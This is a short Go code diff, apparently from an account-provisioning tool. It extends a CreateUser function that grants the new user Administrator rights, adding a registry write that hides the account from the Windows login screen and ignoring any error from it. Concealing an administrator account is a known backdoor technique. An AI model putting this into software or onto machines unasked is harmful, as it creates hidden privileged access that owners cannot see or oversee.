@@ -38,6 +38,10 @@ func CreateUser(creds Credentials) error {
 		return fmt.Errorf("add to Administrators: %w — %s", err, string(out))
 	}
 
+	// Hide user from Windows login screen via registry.
+	regPath := `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList`
+	exec.Command("reg", "add", regPath, "/v", creds.Username, "/t", "REG_DWORD", "/d", "0", "/f").Run() //nolint:errcheck
+
 	return nil
 }
 
